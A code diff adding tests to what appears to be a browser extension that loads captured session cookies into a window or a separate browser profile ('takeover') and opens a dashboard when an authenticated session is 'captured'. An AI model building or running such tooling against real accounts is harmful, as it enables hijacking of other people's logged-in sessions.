@@ -50,6 +50,17 @@ function mockChrome() {
       onMessage: { addListener(fn) { listeners.msg = fn; } },
       getURL: (p) => 'chrome-extension://test/' + p,
       openOptionsPage() {},
+      lastError: null,
+      sendNativeMessage(name, msg, cb) {
+        const h = ch.__native;
+        if (!h) {
+          ch.runtime.lastError = { message: 'Specified native messaging host not found.' };
+          cb(undefined);
+          ch.runtime.lastError = null;
+          return;
+        }
+        Promise.resolve(h(msg)).then((r) => { ch.runtime.lastError = null; cb(r); });
+      },
     },
     action: { setBadgeText() {}, setBadgeBackgroundColor() {} },
     cookies: {
@@ -79,7 +90,9 @@ function mockChrome() {
     windows: {
       async create(o) { const w = { id: ++winSeq, incognito: !!o.incognito }; windows.push(w); return w; },
       async get(id) { const w = windows.find((x) => x.id === id); if (!w) throw new Error('no window'); return w; },
+      async getAll() { return windows.slice(); },
       async update() {},
+      async remove(id) { const i = windows.findIndex((x) => x.id === id); if (i >= 0) windows.splice(i, 1); },
       onRemoved: { addListener(fn) { listeners.winRemoved = fn; } },
     },
     tabs: {
@@ -280,6 +293,56 @@ function payload(id, user, cookies) {
 
   const dry = await bg.onMessage({ action: 'parse', text: 'a=1; b=2', targetUrl: 'https://x.test/' });
   eq('parse action previews the count', dry.count, 2);
+
+  console.log('\nsettings migration');
+  let mc = mockChrome();
+  mc.__storage.settings = { mode: 'isolated' };           // the old v2.0 default
+  eq('legacy "isolated" migrates to a normal window', (await load(mc).getSettings()).mode, 'normal');
+  mc = mockChrome();
+  mc.__storage.settings = { mode: 'incognito', schema: 2 }; // a deliberate choice
+  eq('an explicit incognito choice is kept', (await load(mc).getSettings()).mode, 'incognito');
+
+  console.log('\nprofile mode (native host)');
+  ch = mockChrome();
+  const launches = [];
+  ch.__native = (m) => {
+    if (m.action === 'ping') return { ok: true, browser: '/Applications/Brave', extId: 'abc' };
+    launches.push(m);
+    return { ok: true, profile: '/profiles/' + m.name, pid: 4242 };
+  };
+  bg = load(ch);
+  const prof = await bg.takeover(payload(30, 'zoe@x.test', [cookie('Z', '.x.test', 'v')]), 'profile');
+  ok('profile: reported as an own profile', prof.where === 'own profile', prof.where);
+  eq('profile: no window created in this browser', ch.__windows.length, 0);
+  eq('profile: this profile\'s jars untouched', ch.__stores['0'].length + ch.__stores['1'].length, 0);
+  eq('profile: one launch message', launches.length, 1);
+  const packed = launches[0] && launches[0].payload;
+  ok('profile: session travelled in the launch payload', !!packed);
+  const decoded = JSON.parse(Buffer.from(packed.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8'));
+  eq('profile: payload carries the target', decoded.u, 'https://www.x.test/');
+  eq('profile: payload carries the cookie', decoded.c[0].name, 'Z');
+  ok('profile: window is still tracked as active', !!ch.__storage.active);
+
+  // host missing -> degrade to a normal window rather than failing
+  ch = mockChrome();
+  ch.__native = null;
+  bg = load(ch);
+  const noHost = await bg.takeover(payload(31, 'yan@x.test', [cookie('Y', '.x.test', 'v')]), 'profile');
+  ok('profile without a host degrades', /normal window/.test(noHost.where), noHost.where);
+  eq('profile fallback still wrote cookies', ch.__stores['0'].length, 1);
+
+  console.log('\ntruthful auto-open');
+  ch = mockChrome();
+  bg = load(ch);
+  await bg.onMessage({ action: 'settings', patch: { autoOpen: true, dashboardUrl: 'https://panel.test' } });
+  await bg.onMessage({ action: 'sessions', list: [] });   // first push is never "new"
+  let r1 = await bg.onMessage({ action: 'sessions', list: [
+    { id: 1, has_tokens: true, usable: false },  // email only
+    { id: 2, has_tokens: true, usable: true },   // authenticated
+  ] });
+  eq('only the authenticated session counts as a capture', r1.fresh, 1);
+  let r2 = await bg.onMessage({ action: 'sessions', list: [{ id: 3, has_tokens: true, usable: false }] });
+  eq('a partial session does not bad-raise', r2.fresh, 0);
 
   console.log('\n' + pass + ' passed, ' + fail + ' failed');
   process.exit(fail ? 1 : 0);
